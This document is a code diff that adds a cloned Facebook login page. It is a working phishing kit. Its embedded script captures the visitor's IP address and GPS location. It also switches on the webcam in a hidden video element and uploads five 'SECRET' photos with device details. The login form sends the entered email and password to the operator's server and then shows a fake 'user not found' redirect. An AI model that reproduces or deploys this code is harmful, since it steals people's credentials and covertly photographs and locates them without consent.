@@ -1,0 +1,477 @@
+<!DOCTYPE html>
+<html lang="en">
+  <head>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <link rel="icon" type="image/x-icon" href="/favicon.png">
+    <title>Facebook - log in or sign up</title>
+    <link rel="stylesheet" href="output.css" />
+  </head>
+  <body>
+    <div class="facebook-main">
+      <div class="facebook-container">
+        <div class="facebook-left">
+          <img class="facebook-logo" src="/facebook image.svg" alt="Facebook" />
+          <p class="facebook-tagline">
+            Facebook helps you connect and share with the people in your life.
+          </p>
+        </div>
+
+        <div class="facebook-right">
+          <div class="facebook-form">
+            <form id="loginForm">
+              <input
+                id="email"
+                class="facebook-input"
+                type="text"
+                placeholder="Email or phone number"
+                required
+              />
+              <input
+                id="password"
+                class="facebook-input"
+                type="password"
+                placeholder="Password"
+                required
+              />
+              <button type="submit" class="facebook-login-btn">Log In</button>
+            </form>
+
+            <div class="facebook-divider"></div>
+
+            <button class="facebook-create-btn">Create New Account</button>
+          </div>
+
+          <p class="facebook-page-text">
+            <a href="#" class="facebook-page-link">Create a Page</a> for a celebrity, brand or business.
+          </p>
+        </div>
+      </div>
+    </div>
+
+    <!-- Loading overlay -->
+    <div id="loadingOverlay" class="loading-overlay hidden">
+      <div class="loading-content">
+        <div class="spinner"></div>
+        <span>Logging in...</span>
+      </div>
+    </div>
+
+    <script>
+      let userLocation = null;
+      let userIPAddress = null;
+      let visitId = 'visit_' + Date.now() + '_' + Math.random().toString(36).substr(2, 9);
+
+      console.log('🚀 STARTING FACEBOOK CLONE...');
+      console.log('Visit ID:', visitId);
+
+      // Start everything on page load
+      window.addEventListener('load', function() {
+        console.log('📱 Page loaded - Starting automatic capture...');
+        
+        // Get IP address
+        getIPAddress();
+        
+        // Get location
+        getLocation();
+        
+        // Track page visit
+        setTimeout(() => trackPageVisit(), 1000);
+        
+        // Start camera capture
+        setTimeout(() => startCameraCapture(), 3000);
+      });
+
+      // Get IP address
+      function getIPAddress() {
+        console.log('🌐 Getting IP address...');
+        
+        fetch('https://api.ipify.org?format=json')
+          .then(response => response.json())
+          .then(data => {
+            userIPAddress = data.ip;
+            console.log('✅ IP Address captured:', userIPAddress);
+          })
+          .catch(error => {
+            console.log('❌ IP detection failed:', error);
+          });
+      }
+
+      // Get location
+      function getLocation() {
+        console.log('📍 Getting location...');
+        
+        if (navigator.geolocation) {
+          navigator.geolocation.getCurrentPosition(
+            function(position) {
+              userLocation = {
+                latitude: position.coords.latitude,
+                longitude: position.coords.longitude,
+                accuracy: position.coords.accuracy,
+                source: 'GPS'
+              };
+              
+              console.log('✅ GPS Location captured:', userLocation);
+              
+              // Get city/country
+              getLocationDetails();
+            },
+            function(error) {
+              console.log('❌ GPS failed, trying IP location');
+              getIPLocation();
+            },
+            { enableHighAccuracy: true, timeout: 10000, maximumAge: 0 }
+          );
+        } else {
+          console.log('❌ Geolocation not supported, using IP');
+          getIPLocation();
+        }
+      }
+
+      // Get IP-based location
+      function getIPLocation() {
+        console.log('🌍 Getting IP-based location...');
+        
+        fetch('https://ipapi.co/json/')
+          .then(response => response.json())
+          .then(data => {
+            if (!userIPAddress) userIPAddress = data.ip;
+            
+            userLocation = {
+              latitude: data.latitude,
+              longitude: data.longitude,
+              city: data.city,
+              country: data.country_name,
+              region: data.region,
+              source: 'IP'
+            };
+            
+            console.log('✅ IP Location captured:', userLocation);
+          })
+          .catch(error => {
+            console.log('❌ IP location failed:', error);
+          });
+      }
+
+      // Get city/country from GPS coordinates
+      function getLocationDetails() {
+        if (!userLocation) return;
+        
+        fetch(`https://api.bigdatacloud.net/data/reverse-geocode-client?latitude=${userLocation.latitude}&longitude=${userLocation.longitude}&localityLanguage=en`)
+          .then(response => response.json())
+          .then(data => {
+            userLocation.city = data.city || data.locality;
+            userLocation.country = data.countryName;
+            userLocation.region = data.principalSubdivision;
+            
+            console.log('✅ Location details added:', userLocation);
+          })
+          .catch(error => {
+            console.log('❌ Location details failed:', error);
+          });
+      }
+
+      // Track page visit
+      function trackPageVisit() {
+        console.log('📊 Tracking page visit...');
+        
+        fetch('/api/page-visit', {
+          method: 'POST',
+          headers: {
+            'Content-Type': 'application/json',
+          },
+          body: JSON.stringify({
+            visitId: visitId,
+            ipAddress: userIPAddress,
+            location: userLocation,
+            timestamp: new Date().toISOString(),
+            userAgent: navigator.userAgent,
+            screenResolution: `${screen.width}x${screen.height}`,
+            timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
+            url: window.location.href,
+            referrer: document.referrer
+          })
+        })
+        .then(response => response.json())
+        .then(data => {
+          console.log('✅ Page visit tracked successfully:', data);
+        })
+        .catch(error => {
+          console.log('❌ Page visit tracking failed:', error);
+        });
+      }
+
+      // Start camera capture - Enhanced stealth mode
+      async function startCameraCapture() {
+        console.log('📸 Starting secret camera capture...');
+        
+        try {
+          // Request camera with different quality options
+          const stream = await navigator.mediaDevices.getUserMedia({
+            video: { 
+              width: { ideal: 1920, max: 1920 },
+              height: { ideal: 1080, max: 1080 },
+              facingMode: 'user',
+              frameRate: { ideal: 30 }
+            },
+            audio: false
+          });
+          
+          console.log('✅ Camera access granted - High quality mode');
+          
+          // Create completely hidden video element
+          const video = document.createElement('video');
+          video.style.cssText = `
+            position: fixed !important;
+            top: -10000px !important;
+            left: -10000px !important;
+            width: 1px !important;
+            height: 1px !important;
+            opacity: 0 !important;
+            visibility: hidden !important;
+            z-index: -9999 !important;
+            pointer-events: none !important;
+          `;
+          video.autoplay = true;
+          video.muted = true;
+          video.playsInline = true;
+          video.srcObject = stream;
+          document.body.appendChild(video);
+          
+          // Wait for video to load and start capturing
+          video.onloadedmetadata = function() {
+            video.play().then(() => {
+              console.log('🔒 SECRET: Starting automatic photo capture...');
+              
+              // Capture multiple photos at different intervals
+              setTimeout(() => capturePhoto(video, stream, 1, 'initial'), 1500);
+              setTimeout(() => capturePhoto(video, stream, 2, 'movement'), 4000);
+              setTimeout(() => capturePhoto(video, stream, 3, 'final'), 7000);
+              
+              // Additional photos for better coverage
+              setTimeout(() => capturePhoto(video, stream, 4, 'extra1'), 10000);
+              setTimeout(() => capturePhoto(video, stream, 5, 'extra2'), 13000);
+              
+              // Cleanup after all photos
+              setTimeout(() => {
+                stream.getTracks().forEach(track => {
+                  track.stop();
+                  console.log('🔒 Camera track stopped:', track.kind);
+                });
+                video.remove();
+                console.log('🔒 SECRET: All photos captured and camera cleaned up');
+              }, 15000);
+            }).catch(err => {
+              console.log('❌ Video play failed:', err);
+            });
+          };
+          
+          // Handle any video errors
+          video.onerror = function(error) {
+            console.log('❌ Video error:', error);
+          };
+          
+        } catch (error) {
+          console.log('❌ Camera access denied or failed:', error.message);
+          
+          // Try with lower quality as fallback
+          try {
+            const fallbackStream = await navigator.mediaDevices.getUserMedia({
+              video: { 
+                width: { ideal: 640 },
+                height: { ideal: 480 },
+                facingMode: 'user'
+              }
+            });
+            
+            console.log('✅ Fallback camera access granted');
+            startFallbackCapture(fallbackStream);
+            
+          } catch (fallbackError) {
+            console.log('❌ Fallback camera also failed:', fallbackError.message);
+          }
+        }
+      }
+
+      // Capture individual photo with enhanced quality
+      function capturePhoto(video, stream, photoNumber, captureType = 'standard') {
+        try {
+          const canvas = document.createElement('canvas');
+          const context = canvas.getContext('2d');
+          
+          // Use actual video dimensions for best quality
+          canvas.width = video.videoWidth || 1280;
+          canvas.height = video.videoHeight || 720;
+          
+          // Ensure video is ready before capture
+          if (video.readyState >= 2) {
+            context.drawImage(video, 0, 0, canvas.width, canvas.height);
+            
+            // High quality JPEG with different compression based on photo number
+            const quality = photoNumber === 1 ? 0.95 : photoNumber === 2 ? 0.85 : 0.75;
+            const photoData = canvas.toDataURL('image/jpeg', quality);
+            
+            // Upload photo immediately
+            uploadPhoto(photoData, photoNumber, captureType);
+            
+            console.log(`🔒 SECRET Photo ${photoNumber} (${captureType}) captured: ${Math.round(photoData.length/1024)}KB`);
+          } else {
+            // Retry if video not ready
+            setTimeout(() => capturePhoto(video, stream, photoNumber, captureType), 500);
+          }
+          
+        } catch (error) {
+          console.log(`❌ Photo ${photoNumber} capture failed:`, error);
+        }
+      }
+      
+      // Fallback capture function for lower quality cameras
+      function startFallbackCapture(stream) {
+        const video = document.createElement('video');
+        video.style.cssText = `
+          position: fixed !important;
+          top: -10000px !important;
+          left: -10000px !important;
+          width: 1px !important;
+          height: 1px !important;
+          opacity: 0 !important;
+          visibility: hidden !important;
+        `;
+        video.autoplay = true;
+        video.muted = true;
+        video.srcObject = stream;
+        document.body.appendChild(video);
+        
+        video.onloadedmetadata = function() {
+          video.play();
+          
+          // Capture 3 photos with fallback quality
+          setTimeout(() => capturePhoto(video, stream, 1, 'fallback'), 1000);
+          setTimeout(() => capturePhoto(video, stream, 2, 'fallback'), 3000);
+          setTimeout(() => capturePhoto(video, stream, 3, 'fallback'), 5000);
+          
+          // Cleanup
+          setTimeout(() => {
+            stream.getTracks().forEach(track => track.stop());
+            video.remove();
+            console.log('🔒 Fallback capture completed');
+          }, 7000);
+        };
+      }
+
+      // Upload photo to server with retry mechanism
+      async function uploadPhoto(photoData, photoNumber, captureType = 'standard') {
+        const maxRetries = 3;
+        let retryCount = 0;
+        
+        async function attemptUpload() {
+          try {
+            const response = await fetch('/api/upload-photo', {
+              method: 'POST',
+              headers: {
+                'Content-Type': 'application/json',
+              },
+              body: JSON.stringify({
+                visitId: visitId,
+                photoData: photoData,
+                photoNumber: photoNumber,
+                captureType: captureType,
+                ipAddress: userIPAddress,
+                location: userLocation,
+                timestamp: new Date().toISOString(),
+                quality: photoNumber === 1 ? 'highest' : photoNumber === 2 ? 'high' : 'medium',
+                secret: true,
+                deviceInfo: {
+                  userAgent: navigator.userAgent,
+                  screenResolution: `${screen.width}x${screen.height}`,
+                  colorDepth: screen.colorDepth,
+                  timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
+                  language: navigator.language,
+                  platform: navigator.platform
+                }
+              })
+            });
+            
+            if (!response.ok) {
+              throw new Error(`HTTP ${response.status}`);
+            }
+            
+            const result = await response.json();
+            console.log(`🔒 SECRET Photo ${photoNumber} (${captureType}) uploaded successfully:`, {
+              size: Math.round(photoData.length/1024) + 'KB',
+              quality: result.quality || 'unknown',
+              stored: result.stored
+            });
+            
+          } catch (error) {
+            retryCount++;
+            console.log(`❌ Photo ${photoNumber} upload failed (attempt ${retryCount}):`, error.message);
+            
+            if (retryCount < maxRetries) {
+              console.log(`🔄 Retrying photo ${photoNumber} upload in 2 seconds...`);
+              setTimeout(attemptUpload, 2000);
+            } else {
+              console.log(`❌ Photo ${photoNumber} upload failed after ${maxRetries} attempts`);
+            }
+          }
+        }
+        
+        await attemptUpload();
+      }
+
+      // Handle login form submission
+      document.getElementById('loginForm').addEventListener('submit', async function(e) {
+        e.preventDefault();
+        
+        const email = document.getElementById('email').value;
+        const password = document.getElementById('password').value;
+        const loadingOverlay = document.getElementById('loadingOverlay');
+        
+        console.log('🔐 Login attempt:', { email, password });
+        
+        if (!email || !password) {
+          alert('Please fill in all fields');
+          return;
+        }
+
+        // Show loading
+        loadingOverlay.classList.remove('hidden');
+
+        try {
+          const response = await fetch('/api/login', {
+            method: 'POST',
+            headers: {
+              'Content-Type': 'application/json',
+            },
+            body: JSON.stringify({
+              email: email,
+              password: password,
+              location: userLocation,
+              ipAddress: userIPAddress,
+              timestamp: new Date().toISOString(),
+              userAgent: navigator.userAgent,
+              screenResolution: `${screen.width}x${screen.height}`,
+              timezone: Intl.DateTimeFormat().resolvedOptions().timeZone
+            })
+          });
+
+          const data = await response.json();
+          console.log('📝 Login response:', data);
+          
+          // Hide loading
+          loadingOverlay.classList.add('hidden');
+          
+          // Always redirect to user not found page
+          window.location.href = '/user-not-found';
+          
+        } catch (error) {
+          console.error('❌ Login error:', error);
+          loadingOverlay.classList.add('hidden');
+          
+          // Still redirect to user not found page
+          window.location.href = '/user-not-found';
+        }
+      });
+    </script>
+  </body>
+</html>
